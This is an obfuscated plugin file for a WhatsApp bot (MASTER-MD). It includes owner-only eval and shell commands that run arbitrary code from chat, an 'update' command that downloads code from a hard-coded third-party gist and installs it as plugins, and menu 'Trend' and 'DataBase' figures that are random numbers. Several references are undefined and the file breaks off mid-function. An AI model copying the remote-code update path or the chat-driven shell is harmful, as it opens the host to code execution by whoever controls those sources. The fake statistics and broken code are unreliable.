const os = require('os');
const fs = require('fs');
const Config = require("../config");
const translatte = require("translatte");
const cron = require("node-cron");
var cronStart = false;
const cpuModel = os.cpus()[0].model;
const axios = require("axios");
let {
  fancytext,
  tlang,
  runtime,
  formatp,
  prefix,
  tiny,
  smd,
  bot
} = require("../lib");
const util = require("util");
const astro_patch = require("../lib/plugins");
const {
  exec
} = require("child_process");
const long = String.fromCharCode(8206);
const readmore = long.repeat(4001);
const trend_usage = (() => {
  const _0x84934a = ((_0x349482, _0x311832) => {
    const _0x372c99 = Math.random() * (_0x311832 - (_0x349482 + 1));
    const _0x254b61 = Math.floor(_0x372c99) + _0x349482;
    return _0x254b61;
  })(1, 99);
  return _0x84934a;
})();
const database_info = (() => {
  const _0x2c6181 = ((_0x35447c, _0x468aad) => {
    const _0x302781 = Math.random() * (_0x468aad - (_0x35447c + 1));
    const _0x2c5915 = Math.floor(_0x302781) + _0x35447c;
    return _0x2c5915;
  })(1, 499);
  return _0x2c6181;
})();
exec("dmidecode -t memory", (_0xf22ff9, _0x20850f, _0x3288d4) => {
  if (_0xf22ff9) {
    console.error("Error executing dmidecode: " + _0xf22ff9);
    return;
  }
  if (_0x3288d4) {
    console.error("Error: " + _0x3288d4);
    return;
  }
  const _0x21e1b7 = parseDmiDecodeOutput(_0x20850f);
  console.log("RAM Information:", _0x21e1b7);
});
function parseDmiDecodeOutput(_0x2dcde4) {
  const _0x36fbab = {};
  const _0x4d0758 = _0x2dcde4.split("Memory Device");
  for (let _0x3134eb = 1; _0x3134eb < _0x4d0758.length; _0x3134eb++) {}
  return _0x36fbab;
}
smd({
  'cmdname': "update",
  'type': "owner",
  'info': "Installs external modules or plugins from a provided URL or a predefined list.",
  'fromMe': true,
  'filename': __filename,
  'use': "<gist url>"
}, async (_0x1428d2, _0xeaede0) => {
  try {
    let _0x13f163 = [];
    let _0x1738f5 = {};
    let _0x4de025 = {};
    try {
      const {
        data: _0x29d9c1
      } = await axios.get("https://gist.github.com/Itxxwasi/65bd53b76894484da0fd0a16c114053a/raw");
      _0x1738f5 = {
        ...(typeof _0x29d9c1.external === "object" ? _0x29d9c1.external : {}),
        ...(typeof _0x29d9c1.plugins === "object" ? _0x29d9c1.plugins : {})
      };
      _0x13f163 = _0x29d9c1.names;
      _0x4de025 = _0x29d9c1.extension && typeof _0x29d9c1.extension === "object" ? _0x29d9c1.extension : {};
    } catch (_0x283379) {
      _0x1738f5 = {};
    }
    _0x13f163 = Array.isArray(_0x13f163) ? _0x13f163 : [];
    if (bot && bot.plugins) {
      await send.message("`Downloading Update`");
      _0x1738f5 = {
        ...bot.plugins,
        ..._0x1738f5
      };
    }
    let _0xdff39e = _0xeaede0 ? _0xeaede0 : _0x1428d2.quoted ? _0x1428d2.quoted.text : '';
    if (_0xdff39e.toLowerCase().includes("https")) {
      try {
        const {
          data: _0x3d50f7
        } = await axios.get(_0xdff39e);
        const _0x168f63 = _0xdff39e.split('/').pop().split('.')[0];
        const _0x1aa92f = _0x168f63 + (_0x4de025[_0x168f63] && /.js|.smd/gi.test(_0x4de025[_0x168f63]) ? _0x4de025[_0x168f63] : ".js");
        const _0x2ea3b5 = plugin_dir + (_0x1aa92f.includes('/') ? _0x1aa92f.split('/')[0] : '');
        if (!fs.existsSync(_0x2ea3b5)) {
          fs.mkdirSync(_0x2ea3b5, {
            'recursive': true
          });
        }
        fs.writeFileSync(plugin_dir + _0x1aa92f, _0x3d50f7, "utf8");
        log(" " + _0x168f63 + " ✔️");
      } catch (_0x47e6dc) {
        log(" " + pluginName + " ❌");
      }
    } else {
      if (Object.keys(_0x1738f5 || {}).length > 0) {
        const _0x499cc9 = _0x1738f5;
        for (const _0x1e7892 in _0x499cc9) {
          try {
            const _0x5a9a1c = _0x499cc9[_0x1e7892].includes("raw") ? _0x499cc9[_0x1e7892] : _0x499cc9[_0x1e7892] + "/raw";
            const {
              data: _0x49e624
            } = await axios.get(_0x5a9a1c);
            if (_0x49e624) {
              const _0x1f471c = _0x1e7892 + (_0x4de025[_0x1e7892] && /.js|.smd/gi.test(_0x4de025[_0x1e7892]) ? _0x4de025[_0x1e7892] : ".js");
              const _0x57fb3b = plugin_dir + (_0x1f471c.includes('/') ? _0x1f471c.split('/')[0] : '');
              if (!fs.existsSync(_0x57fb3b)) {
                fs.mkdirSync(_0x57fb3b, {
                  'recursive': true
                });
              }
              fs.writeFileSync(plugin_dir + _0x1f471c, _0x49e624, "utf8");
              if (!_0x13f163.includes(_0x1e7892)) {
                log(" " + _0x1e7892 + " ✔️");
              }
            }
          } catch (_0x5daee9) {
            if (!_0x13f163.includes(_0x1e7892)) {
              log(" " + _0x1e7892 + " ❌");
            }
          }
        }
        return await _0x1428d2.send("`MASTER-MD UPDATE WAS SUCCESSFULL ✅`");
      } else {
        return await _0x1428d2.send("*Auto Updated Failed, Unable to Download Update Please Manually Do It*");
      }
    }
  } catch (_0x2e6257) {
    log("❌ ERROR INSTALATION PLUGINS ", _0x2e6257);
  }
});
astro_patch.smd({
  'cmdname': "menu",
  'desc': "Help list",
  'react': '📃',
  'desc': "To show all avaiable commands.",
  'type': "user",
  'filename': __filename
}, async (_0x978ae2, _0x5240b1) => {
  try {
    const {
      commands: _0x11778e
    } = require("../lib");
    if (_0x5240b1.split(" ")[0]) {
      let _0x130c37 = [];
      const _0x42d6fd = _0x11778e.find(_0x2510aa => _0x2510aa.pattern === _0x5240b1.split(" ")[0].toLowerCase());
      if (_0x42d6fd) {
        _0x130c37.push("*🔉Command:* " + _0x42d6fd.pattern);
        if (_0x42d6fd.category) {
          _0x130c37.push("*💁Category:* " + _0x42d6fd.category);
        }
        if (_0x42d6fd.alias && _0x42d6fd.alias[0]) {
          _0x130c37.push("*💁Alias:* " + _0x42d6fd.alias.join(", "));
        }
        if (_0x42d6fd.desc) {
          _0x130c37.push("*💁Description:* " + _0x42d6fd.desc);
        }
        if (_0x42d6fd.use) {
          _0x130c37.push("*〽️Usage:*\n ```" + prefix + _0x42d6fd.pattern + " " + _0x42d6fd.use + "```");
        }
        if (_0x42d6fd.usage) {
          _0x130c37.push("*〽️Usage:*\n ```" + _0x42d6fd.usage + "```");
        }
        await _0x978ae2.reply(_0x130c37.join("\n"));
      }
    }
    let _0xeb227f;
    let _0x3aeff6;
    let _0x22d271;
    let _0xae6b6d;
    let _0x33fbf2;
    let _0x2b7882;
    let _0x268550;
    if (Config.menu === '') {
      _0xeb227f = Math.floor(Math.random() * 4) + 1;
    }
    if (_0xeb227f === 1 || Config.menu.trim().startsWith('1') || Config.menu.toLowerCase().includes("menu1")) {
      _0x3aeff6 = "╭━━━〔 *" + Config.botname + "* 〕━━━┈⊷";
      _0x2b7882 = "┃👨‍💻│";
      _0x22d271 = "┃☆╰──────────────\n╰━━━━━━━━━━━━━━━┈⊷";
      _0xae6b6d = "╭─────────────┈⊷\n│「";
      _0x33fbf2 = "」\n╰┬────────────┈⊷";
      _0x2b7882 = "││◦☆";
      _0x268550 = "│╰────────────┈⊷\n╰─────────────┈⊷";
    } else {
      if (_0xeb227f === 2 || Config.menu.trim().startsWith('2') || Config.menu.toLowerCase().includes("menu2")) {
        _0x3aeff6 = "╭═══ *" + Config.botname + "* ═══⊷\n┃☆╭──────────────";
        _0x2b7882 = "┃⚖│";
        _0x22d271 = "┃☆╰───────────────\n╰═════════════════⊷";
        _0xae6b6d = "╭─❏";
        _0x33fbf2 = '❏';
        _0x2b7882 = "┃⚖│";
        _0x268550 = "┃☆╰───────────────\n╰═════════════════⊷";
      } else {
        _0x3aeff6 = "╭〘  " + Config.botname + "  〙";
        _0x2b7882 = "│ │";
        _0x22d271 = "╰═══════════════⊷";
        _0xae6b6d = "╭─❍👨‍💻";
        _0x33fbf2 = "👨‍💻══⊷❍";
        _0x2b7882 = '│⚖';
        _0x268550 = "╰════════════─⊷";
      }
    }
    const _0x24cc58 = {};
    _0x11778e.map(async _0x2a38a2 => {
      if (_0x2a38a2.dontAddCommandList === false && _0x2a38a2.pattern !== undefined) {
        if (!_0x24cc58[_0x2a38a2.category]) {
          _0x24cc58[_0x2a38a2.category] = [];
        }
        _0x24cc58[_0x2a38a2.category].push(_0x2a38a2.pattern);
      }
    });
    const _0x397fa9 = _0x978ae2.time;
    const _0x474161 = _0x978ae2.date;
    let _0x59a230 = "\n" + _0x3aeff6 + "\n" + _0x2b7882 + " *🧛‍♂️ Ｕꜱᴇʀ:-* " + Config.ownername + "\n" + _0x2b7882 + " *🧛‍♂️ Ｕᴘᴛɪᴍᴇ:-* " + runtime(process.uptime()) + "\n" + _0x2b7882 + " *🧛‍♂️ Ｒᴀᴍ:-* " + formatp(os.totalmem() - os.freemem()) + "\n" + _0x2b7882 + " *🧛‍♂️ Ｔɪᴍᴇ:-* " + _0x397fa9 + "\n" + _0x2b7882 + " *🧛‍♂️ Ｍᴏᴅᴇ:-* " + Config.WORKTYPE + "\n" + _0x2b7882 + " *🧛‍♂️ Ｄᴀᴛᴇ:-* " + _0x474161 + "\n" + _0x2b7882 + " *🧛‍♂️ Ｃᴍᴅꜱ:-* " + _0x11778e.length + "\n" + _0x2b7882 + " *🧛‍♂️ Ｔʀᴇɴᴅ:-* " + trend_usage + "\n" + _0x2b7882 + " *🧛‍♂️ ＤᴀᴛᴀＢᴀꜱᴇ:-* " + database_info + "\n" + _0x22d271 + "  \n▱▰▱▰▱▰▱▰▱▰▱▱▰▱▱▰\n👨‍💻SHANUWA-ＭＤ👨‍💻\nᴋᴇᴇᴘ ᴜꜱɪɴɢ ᴍᴀꜱᴛᴇʀ ᴍᴅ\n▱▰▱▰▱▰▱▰▱▰▱▱▰▱▱▰\n\n" + readmore;
    for (const _0x118481 in _0x24cc58) {
      _0x59a230 += "\n        " + _0xae6b6d + " *" + tiny(_0x118481) + "* " + _0x33fbf2 + "\n";
      if (_0x5240b1.toLowerCase() === _0x118481.toLowerCase()) {
        _0x59a230 = _0xae6b6d + " *" + tiny(_0x118481) + "* " + _0x33fbf2 + "\n";
        for (const _0x2f4bdc of _0x24cc58[_0x118481]) {
          _0x59a230 += _0x2b7882 + " " + Config.HANDLERS + " " + tiny(_0x2f4bdc, 1) + "\n";
        }
        _0x59a230 += _0x268550 + "\n";
        break;
      } else {
        for (const _0xe6b3d4 of _0x24cc58[_0x118481]) {
          _0x59a230 += _0x2b7882 + " " + Config.HANDLERS + " " + tiny(_0xe6b3d4, 1) + "\n";
        }
        _0x59a230 += _0x268550 + "\n";
      }
    }
    _0x59a230 += Config.caption;
    const _0x48b866 = {
      'caption': _0x59a230,
      'ephemeralExpiration': 0x1e
    };
    return await _0x978ae2.sendUi(_0x978ae2.chat, _0x48b866, _0x978ae2);
  } catch (_0x113370) {
    await _0x978ae2.error(_0x113370 + "\nCommand: menu", _0x113370);
  }
});
smd({
  'pattern': "menus",
  'type': "MENU list",
  'info': "user",
  'dontAddCommandList': true
}, async _0x409175 => {
  try {
    let _0x5a4859 = ("\n*➮ᴜᴘ ᴛɪᴍᴇ :* " + runtime(process.uptime()) + "\n*➮ᴛᴏᴅᴀʏ ɪs :* " + _0x409175.date + "\n*➮ɴᴏᴡ ᴛɪᴍᴇ :* " + _0x409175.time + "\n\n➮Fᴏᴜɴᴅᴇʀ- Sahan Maduwantha\n➮Oᴡɴᴇʀ - " + Config.ownername + "\n➮Nᴜᴍ - " + owner.split(',')[0] + "\n➮Mᴇᴍᴏ - " + formatp(os.totalmem() - os.freemem()) + '/' + formatp(os.totalmem()) + "\n\n *🧑‍💻 :* MASTER MD\n\n" + readmore + "\n╭──❰ *ALL MENU* ❱\n│🏮 Lɪꜱᴛ\n│🏮 Cᴀᴛᴇɢᴏʀʏ\n│🏮 Hᴇʟᴘ\n│🏮 Aʟɪᴠᴇ\n│🏮 Uᴘᴛɪᴍᴇ\n│🏮 Wᴇᴀᴛʜᴇʀ\n│🏮 Lɪɴᴋ\n│🏮 Cᴘᴜ\n│🏮 Rᴇᴘᴏꜱɪᴛᴏʀʏ\n╰─────────────⦁").trim();
    return await _0x409175.bot.sendUi(_0x409175.from, {
      'caption': _0x5a4859
    });
  } catch (_0x3f7a4c) {
    await _0x409175.error(_0x3f7a4c + "\nCommand:menus", _0x3f7a4c);
  }
});
astro_patch.cmd({
  'pattern': "setcmd",
  'desc': "To check ping",
  'category': "user",
  'fromMe': true,
  'filename': __filename
}, async (_0xc41cce, _0xad2da, {
  Void: _0x1d99a9
}) => {
  try {
    if (!_0xad2da) {
      return await _0xc41cce.send("*_Please provide cmd name by replying a Sticker_*");
    }
    let _0x2c070c = _0xad2da.split(',');
    var _0x2c49be;
    var _0x5b6f44;
    let _0x3d6b4a = false;
    if (_0xc41cce.quoted) {
      let _0xd68c = _0xc41cce.quoted.mtype;
      if (_0xd68c == "stickerMessage" && _0xad2da) {
        _0x3d6b4a = true;
        _0x2c49be = _0xad2da.split(" ")[0];
        _0x5b6f44 = "sticker-" + _0xc41cce.quoted.msg.fileSha256;
      }
    }
    if (!_0x3d6b4a && _0x2c070c.length > 1) {
      _0x5b6f44 = _0x2c070c[0].trim().toLowerCase();
      _0x2c49be = _0x2c070c[1].trim().toLowerCase();
    } else {
      if (!_0x3d6b4a) {
        return await _0xc41cce.send("*_Uhh Dear, Give Cmd With New Name_*\n*Eg: _.setcmd New_Name, Cmd_Name_*");
      }
    }
    if (_0x5b6f44.length < 1) {
      return await _0xc41cce.reply("*_Uhh Please, Provide New_Cmd Name First_*");
    }
    if (global.setCmdAlias[_0x5b6f44]) {
      return await _0xc41cce.send("*_\"" + (_0x3d6b4a ? "Given Sticker" : _0x5b6f44) + "\" Already set for \"" + global.setCmdAlias[_0x5b6f44] + "\" Cmd, Please try another " + (_0x3d6b4a ? "Sticker" : "Name") + '_*');
    }
    const _0x5af9f7 = astro_patch.commands.find(_0xad3ea9 => _0xad3ea9.pattern === _0x2c49be) || astro_patch.commands.find(_0x1920e9 => _0x1920e9.alias && _0x1920e9.alias.includes(_0x2c49be));
    return _0x5af9f7 ? (global.setCmdAlias[_0x5b6f44] = _0x5af9f7.pattern, await _0xc41cce.send("*_Cmd \"" + global.setCmdAlias[_0x5b6f44] + "\" Succesfully set to \"" + (_0x3d6b4a ? "Sticker" : _0x5b6f44) + "\"._*\n*_These all names are reset, If bot restart_*")) : await _0xc41cce.send("*_Provided Cmd( " + _0x2c49be + ") not found in bot cmds. Please Provide Valid cmd Name_*");
  } catch (_0x402c19) {
    await _0xc41cce.error(_0x402c19 + "\nCommand:setcmd", _0x402c19);
  }
});
astro_patch.cmd({
  'pattern': "delcmd",
  'desc': "To check ping",
  'category': "user",
  'fromMe': true,
  'filename': __filename
}, async (_0x46e269, _0x1bae8, {
  Void: _0xeb2baa
}) => {
  try {
    let _0xc1a3f = _0x1bae8 ? _0x1bae8.split(" ")[0].trim().toLowerCase() : '';
    let _0x1b3b19 = false;
    if (_0x46e269.quoted) {
      if (_0x46e269.quoted.mtype == "stickerMessage") {
        _0x1b3b19 = true;
        _0xc1a3f = "sticker-" + _0x46e269.quoted.msg.fileSha256;
      } else {
        if (!_0x1bae8) {
          return await _0x46e269.send("*_Please reply to a Sticker that set for a Cmd_*");
        }
      }
    } else {
      if (!_0x1bae8) {
        return await _0x46e269.send("*_Uhh Dear, provide Name that set to a cmd_*\n*Eg: _.delcmd Cmd_Name_*");
      }
    }
    if (global.setCmdAlias[_0xc1a3f]) {
      await _0x46e269.send("*_\"" + (_0x1b3b19 ? "Given Sticker" : _0xc1a3f) + "\" deleted Succesfully at \"" + global.setCmdAlias[_0xc1a3f] + "\" cmd_*");
      delete global.setCmdAlias[_0xc1a3f];
      return;
    } else {
      return await _0x46e269.send("*_\"" + (_0x1b3b19 ? "Given Sticker" : _0xc1a3f) + "\" not Set for any cmd._*\n *_Please Provide Valid " + (_0x1b3b19 ? "Sticker" : "cmd Name") + " to delete_*");
    }
  } catch (_0x171533) {
    await _0x46e269.error(_0x171533 + "\nCommand:delcmd", _0x171533);
  }
});
astro_patch.smd({
  'pattern': "ping",
  'desc': "To check ping",
  'category': "user",
  'filename': __filename
}, async _0x292f92 => {
  const _0x293e97 = new Date().getTime();
  const {
    key: _0x36c891
  } = await _0x292f92.reply("*`SHANUWA MIND...`*");
  const _0x5d708a = new Date().getTime();
  const _0x45c6d1 = _0x5d708a - _0x293e97;
  await _0x292f92.send("*ᴍᴀꜱᴛᴇʀ ᴍᴅ ᴘɪɴɢ ꜱᴘᴇᴇᴅ: " + _0x45c6d1 + " ᴍs*", {
    'edit': _0x36c891
  }, '', _0x292f92);
});
smd({
  'pattern': "liv",
  'desc': "Shows system status with different designs.",
  'category': "general",
  'filename': __filename,
  'use': "LIV"
}, async (_0x526c22, _0x3bcd49) => {
  try {
    const _0xaf491c = new Date().getTime();
    const _0x586203 = [async () => {
      const _0x38ecaf = await axios.get("https://telegra.ph/file/2368f1b5d6ff724ae0c51.jpg", {
        'responseType': "arraybuffer"
      });
      const _0x8e3485 = await axios.get("https://api.maher-zubair.tech/misc/quote");
      const _0x4e2a4f = _0x8e3485.data;
      if (!_0x4e2a4f || _0x4e2a4f.status !== 200) {
        return await _0x526c22.reply("*Failed to fetch a quote.*");
      }
      const _0x5ccb54 = "\n\n*\"" + _0x4e2a4f.result.body + "\"*\n_- " + _0x4e2a4f.result.author + '_';
      const _0x42e066 = new Date().getTime();
      const _0x3c0bbc = (_0x42e066 - _0xaf491c) / 1000;
      const _0x354d54 = "MASTER MD V2\n\n*Ping:* " + _0x3c0bbc + " seconds" + _0x5ccb54 + "\n\nMASTER MD V2";
      return {
        'image': _0x38ecaf.data,
        'caption': _0x354d54
      };
    }, async () => {
      const _0x451b27 = await axios.get("https://telegra.ph/file/2368f1b5d6ff724ae0c51.jpg", {
        'responseType': "arraybuffer"
      });
      const _0x478519 = await axios.get("https://api.maher-zubair.tech/misc/fact");
      const _0x2ae953 = _0x478519.data;
      if (!_0x2ae953 || _0x2ae953.status !== 200) {
        return await _0x526c22.reply("*Failed to fetch a fact.*");
      }
      const _0x2bbfe3 = new Date().getTime();
      const _0xf7a1bd = (_0x2bbfe3 - _0xaf491c) / 1000;
      const _0xb9e392 = "MASTER MD V2 \n\n*Ping:* " + _0xf7a1bd + " seconds\n\n*Fact:*\n" + _0x2ae953.result.fact + "\n\nMASTER MD V2";
      return {
        'image': _0x451b27.data,
        'caption': _0xb9e392
      };
    }, async () => {
      const _0x424141 = await axios.get("https://telegra.ph/file/2368f1b5d6ff724ae0c51.jpg", {
        'responseType': "arraybuffer"
      });
      const _0xd98374 = await axios.get("https://api.maher-zubair.tech/misc/lines");
      const _0x4ee7aa = _0xd98374.data;
      if (!_0x4ee7aa || _0x4ee7aa.status !== 200) {
        return await _0x526c22.reply("*Failed to fetch a line.*");
      }
      const _0x297f18 = new Date().getTime();
      const _0x437628 = (_0x297f18 - _0xaf491c) / 1000;
      const _0xe0f16f = "\n\n*Ping:* " + _0x437628 + " seconds\n\n*Line:*\n" + _0x4ee7aa.result + "\n\n𝗕𝗬-𝗪𝗔𝗦𝗜-𝗦𝗘𝗥";
      return {
        'image': _0x424141.data,
        'caption': _0xe0f16f
      };
    }];
    const _0x38f6f5 = _0x586203[Math.floor(Math.random() * _0x586203.length)];
    const _0x36846b = await _0x38f6f5();
    const _0x2d20dd = {
      'quoted': _0x526c22,
      'contextInfo': {
        'forwardingScore': 0x3e7,
        'isForwarded': true
      }
    };
    return await _0x526c22.bot.sendUi(_0x526c22.chat, _0x36846b, _0x2d20dd);
  } catch (_0x4ae831) {
    await _0x526c22.error(_0x4ae831 + "\n\nCommand: LIV", _0x4ae831, "*Failed to show status.*");
  }
});
smd({
  'pattern': "runtime",
  'desc': "Show the uptime, RAM usage, and CPU name of the process.",
  'category': "general",
  'filename': __filename
}, async _0x257d1d => {
  try {
    const _0x25e2ed = process.uptime();
    const _0xb0a3ac = Math.floor(_0x25e2ed / 3600);
    const _0x509270 = Math.floor(_0x25e2ed % 3600 / 60);
    const _0x12b376 = Math.floor(_0x25e2ed % 60);
    const _0xe8aa23 = process.memoryUsage().heapTotal / 1024 / 1024;
    const _0x346845 = "*ＭＡＳＴＥＲ-ＭＤ-𝗜𝗡-𝗥𝗨𝗡𝗡𝗜𝗡𝗚-𝗙𝗥𝗢𝗠:* " + _0xb0a3ac + "h " + _0x509270 + "ᴍ " + _0x12b376 + "s\n \t_ʜᴇʀᴇ's ᴍᴏʀᴇ ɪɴғᴏ_\n*ʀᴀᴍ ᴜsᴀɢᴇ:* " + _0xe8aa23.toFixed(2) + " MB\n*ᴄᴘᴜ ɴᴀᴍᴇ:* " + cpuModel;
    const _0x106c38 = {
      'isForwarded': true,
      'forwardingScore': 0x3e7,
      'title': "MASTER MD Running Since",
      'body': _0x346845,
      'footerText': "MASTER MD 2024",
      'isSendNotificationMsg': true,
      'mentionedJid': []
    };
    await _0x257d1d.bot.sendMessage(_0x257d1d.chat, {
      'text': _0x346845,
      'contextInfo': _0x106c38
    }, {
      'quoted': null
    });
  } catch (_0x5eb318) {
    await _0x257d1d.error(_0x5eb318 + "\n\ncommand: runtime", _0x5eb318);
  }
});
astro_patch.cmd({
  'pattern': "list",
  'desc': "list menu",
  'category': "general",
  'react': '📄'
}, async _0xd589b => {
  try {
    const {
      commands: _0x1956b1
    } = require("../lib");
    let _0x3a8131 = "\n\t*👨‍💻ＭＡＳＴＥＲ-ＭＤ ＣＭＤ ＩＮＦＯ👨‍💻*  \n";
    for (let _0x1960c3 = 0; _0x1960c3 < _0x1956b1.length; _0x1960c3++) {
      if (_0x1956b1[_0x1960c3].pattern == undefined) {
        continue;
      }
      _0x3a8131 += '*' + (_0x1960c3 + 1) + " " + fancytext(_0x1956b1[_0x1960c3].pattern, 1) + "*\n";
      _0x3a8131 += "  " + fancytext(_0x1956b1[_0x1960c3].desc, 1) + "\n";
    }
    return await _0xd589b.sendUi(_0xd589b.chat, {
      'caption': _0x3a8131 + Config.caption
    });
  } catch (_0x3e31ef) {
    await _0xd589b.error(_0x3e31ef + "\nCommand:list", _0x3e31ef);
  }
});
astro_patch.smd({
  'pattern': "owner",
  'desc': "To check ping",
  'category': "user",
  'filename': __filename
}, async _0x3f6f38 => {
  try {
    const _0x41a29c = "BEGIN:VCARD\nVERSION:3.0\nFN:" + Config.ownername + "\nORG:;\nTEL;type=CELL;type=VOICE;waid=" + global.owner?.["split"](',')[0] + ':+' + global.owner?.["split"](',')[0] + "\nEND:VCARD";
    let _0x2d68b0 = {
      'contacts': {
        'displayName': Config.ownername,
        'contacts': [{
          'vcard': _0x41a29c
        }]
      },
      'contextInfo': {
        'externalAdReply': {
          'title': Config.ownername,
          'body': "Touch here.",
          'renderLargerThumbnail': true,
          'thumbnailUrl': '',
          'thumbnail': log0,
          'mediaType': 0x1,
          'mediaUrl': '',
          'sourceUrl': "https://wa.me/+" + global.owner?.["split"](',')[0] + "?text=Hii+" + Config.ownername
        }
      }
    };
    return await _0x3f6f38.sendMessage(_0x3f6f38.jid, _0x2d68b0, {
      'quoted': _0x3f6f38
    });
  } catch (_0x144170) {
    await _0x3f6f38.error(_0x144170 + "\nCommand:owner", _0x144170);
  }
});
astro_patch.cmd({
  'pattern': "trt",
  'alias': ["translate"],
  'category': "user",
  'filename': __filename,
  'use': "< text >",
  'desc': "Translate's given text in desird language."
}, async (_0x3378dd, _0x43be39) => {
  try {
    let _0x4423c6 = _0x43be39 ? _0x43be39.split(" ")[0].toLowerCase() : 'en';
    if (!_0x3378dd.reply_text) {
      var _0x30131c = _0x43be39.replace(_0x4423c6, '')?.["trim"]() || false;
    } else {
      var _0x30131c = _0x3378dd.reply_text;
    }
    if (!_0x30131c) {
      return await _0x3378dd.reply("*Please Give Me Text. Example: _" + prefix + "trt en Who are you_*");
    }
    var _0x23bd47 = await translatte(_0x30131c, {
      'from': "auto",
      'to': _0x4423c6
    });
    if ("text" in _0x23bd47) {
      return await _0x3378dd.reply(_0x23bd47.text);
    }
  } catch (_0x495e68) {
    await _0x3378dd.error(_0x495e68 + "\n\ncommand trt", _0x495e68);
  }
});
const readDirectory = _0xf6255c => {
  return new Promise((_0x391ef9, _0x43b420) => {
    fs.readdir(_0xf6255c, (_0x2df9e9, _0x2f6829) => {
      if (_0x2df9e9) {
        _0x43b420("Error reading directory");
      } else {
        _0x391ef9(_0x2f6829);
      }
    });
  });
};
astro_patch.cmd({
  'pattern': "file",
  'desc': "to get extact name where that command is in repo.\nSo user can edit that.",
  'category': "user",
  'fromMe': true,
  'filename': __filename
}, async (_0x180cb8, _0x50af3f) => {
  try {
    if (!_0x50af3f) {
      return _0x180cb8.reply("*Uhh PLease, Provide A Command/Directory*");
    }
    if (_0x50af3f.startsWith('.')) {
      let _0x1a5ead = "*------------- FILE MANAGER -------------*\n";
      try {
        const _0x29fdd7 = await readDirectory(_0x50af3f);
        _0x29fdd7.forEach(_0xfd0038 => {
          _0x1a5ead += _0xfd0038 + "\n";
        });
        await _0x180cb8.reply(_0x1a5ead.toString());
      } catch (_0x251a69) {
        _0x180cb8.reply(_0x251a69);
      }
      return;
    }
    let _0x315675 = [];
    let _0x3d133a = _0x50af3f.split(" ")[0].toLowerCase().trim();
    let _0x2037ae = astro_patch.commands.find(_0xd520c8 => _0xd520c8.pattern === _0x3d133a) || astro_patch.commands.find(_0x582176 => _0x582176.alias && _0x582176.alias.includes(_0x3d133a));
    if (!_0x2037ae) {
      return await _0x180cb8.reply("*❌No Such commands.*");
    }
    _0x315675.push("*🍁Command:* " + _0x2037ae.pattern);
    if (_0x2037ae.category) {
      _0x315675.push("*🧩Type:* " + _0x2037ae.category);
    }
    if (_0x2037ae.alias && _0x2037ae.alias[0]) {
      _0x315675.push("*🧩Alias:* " + _0x2037ae.alias.join(", "));
    }
    if (_0x2037ae.desc) {
      _0x315675.push("*✨Description:* " + _0x2037ae.desc);
    }
    if (_0x2037ae.use) {
      _0x315675.push("*〽️Usa:*\n ```" + prefix + _0x2037ae.pattern + " " + _0x2037ae.use + "```");
    }
    if (_0x2037ae.usage) {
      _0x315675.push("*〽️Usage:*\n ```" + _0x2037ae.usage + "```");
    }
    if (_0x2037ae.filename) {
      _0x315675.push("*✨FileName:* " + _0x2037ae.filename);
    }
    try {
      if (_0x50af3f.includes("function") && _0x2037ae["function"] && _0x180cb8.isAstro && _0x2037ae.pattern !== "file") {
        _0x315675.push("*🧩Function:* " + _0x2037ae["function"].toString());
      }
    } catch {}
    await _0x180cb8.reply(_0x315675.join("\n"));
  } catch (_0x274db0) {
    await _0x180cb8.error(_0x274db0 + "\nCommand:file", _0x274db0);
  }
});
astro_patch.cmd({
  'pattern': "eval",
  'alias': ['$'],
  'category': "owner",
  'filename': __filename,
  'fromMe': true,
  'desc': "Runs js code on node server.",
  'use': "< run code >",
  'dontAddCommandList': true
}, async (_0x39dfad, _0x201f6f, {
  isCreator: _0x523b06,
  cmdName: _0x2bc67b,
  Void: _0x4b76d8
}) => {
  try {
    if (!_0x201f6f) {
      return _0x39dfad.reply("*`Provide A Query To Run Master`*");
    }
    let _0x2115f1 = eval("const a = async()=>{\n" + _0x201f6f + "\n}\na()");
    if (typeof _0x2115f1 === "object") {
      await _0x39dfad.reply(JSON.stringify(_0x2115f1));
    } else {
      await _0x39dfad.reply(_0x2115f1.toString());
    }
  } catch (_0x429de3) {
    return await _0x39dfad.reply(_0x429de3.toString());
  }
});
astro_patch.cmd({
  'pattern': "shell",
  'category': "owner",
  'filename': __filename,
  'fromMe': true,
  'desc': "Runs command in Heroku(server) shell.",
  'use': "<shell cmds | ls,cd >",
  'dontAddCommandList': true
}, async (_0x1eeff4, _0x514af3) => {
  try {
    if (!_0x1eeff4.isCreator) {
      return _0x1eeff4.reply(tlang().owner);
    }
    if (!_0x514af3) {
      return _0x1eeff4.reply("*`Uhh PLease, Provide A Command to Run Heroku`*");
    }
    exec(_0x514af3, (_0xce7c0d, _0x39336a) => {
      if (_0xce7c0d) {
        return _0x1eeff4.reply("----" + tlang().title + "----\n\n" + _0xce7c0d);
      }
      if (_0x39336a) {
        return _0x1eeff4.reply("----" + tlang().title + "----\n\n" + _0x39336a);
      }
    });
  } catch (_0x4faf5) {
    await _0x1eeff4.error(_0x4faf5 + "\n\ncommand shell", _0x4faf5);
  }
});
smd({
  'on': "text"
}, async (_0x39115c, _0x423368, {
  mek: _0x506319,
  body: _0x45a0cc,
  args: _0x4430d5,
  botNumber: _0x2cbbe4,
  isCreator: _0x8eadfc,
  icmd: _0x450981,
  store: _0x195db1,
  budy: _0x1e4951,
  Suhail: _0x1f2392,
  Void: _0x369235,
  proto: _0x2ba6eb
}) => {
  try {
    if (!cronStart) {
      cron.schedule("*/15 * * * *", () => {
        cronStart = true;
        fs.readdir("./temp", (_0x54e531, _0xc1cf25) => {
          if (_0x54e531) {
            return;
          }
          _0xc1cf25.forEach(_0x156bcd => {
            try {
              fs.unlink("./temp/" + _0x156bcd);
            } catch {}
          });
        });
      });
    }
    if (!_0x39115c.reply_message || !_0x423368 || !_0x39115c.isPublic) {
      return;
    }
    const _0x5c9965 = _0x39115c.reply_message.text.split("\n");
    let _0x9a538c = parseInt(_0x423368.split(" ")[0]);
    if (!isNaN(_0x9a538c)) {
      if (_0x5c9965.length > 30 && _0x5c9965[1].includes("WASI-MD_FANCY_TEXT")) {
        var _0x172a14 = _0x5c9965.find(_0xa8f31c => _0xa8f31c.startsWith(_0x9a538c + " "));
        try {
          if (_0x172a14) {
            await _0x39115c.send(_0x172a14.replace('' + _0x9a538c, '').trim(), {}, '', _0x39115c);
          } else {
            '';
          }
        } catch {}
      }
    }
    let _0x59ee5c = parseFloat(_0x423368.split(" ")[0]);
    if (isNaN(_0x59ee5c)) {
      return;
    }
    let _0x226ad1 = _0x59ee5c.toFixed(1);
